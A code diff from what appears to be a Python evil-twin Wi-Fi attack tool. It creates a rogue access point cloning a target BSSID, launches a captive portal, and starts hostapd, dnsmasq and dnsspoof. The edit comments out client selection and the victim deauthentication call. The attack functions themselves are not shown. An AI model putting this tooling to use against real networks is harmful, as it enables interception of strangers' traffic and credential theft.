@@ -81,13 +81,13 @@ def main():
                     sys.exit(0)
                 if sub == 'b':
                     break
-                if not sub.isdigit() or int(sub) not in range(len(clients)):
-                    print("Invalid choice.")
-                    continue
+                # if not sub.isdigit() or int(sub) not in range(len(clients)):
+                #     print("Invalid choice.")
+                #     continue
 
-                client_mac = list(clients.keys())[int(sub)]
-                print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
-                print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")
+                # client_mac = list(clients.keys())[int(sub)]
+                # print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
+                # print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")
 
                 # 1) Create the fake AP configs & networking
                 print(f"\nCreating Evil AP with BSSID {bssid} on interface {ap_iface}...")
@@ -98,14 +98,14 @@ def main():
                 portal_thread = Thread(target=attack.start_captive_portal, daemon=True)
                 portal_thread.start()
 
+                time.sleep(5)
                 # 3) Bring up hostapd, dnsmasq and dnsspoof
                 # Capture the process handles so you can shut them down cleanly later
                 print("Starting hostapd/dnsmasq/dnsspoof…")
                 procs = attack.start_attack(ap_iface)
 
                 # 4) Deauth the victim until they associate to your Evil AP
-                attack.deauth_victim({'BSSID': bssid}, client_mac, iface
-                )
+                # attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
 
                 # 5) Stop sniffing now that the victim is “in”
                 scan.stop_sniff.set()
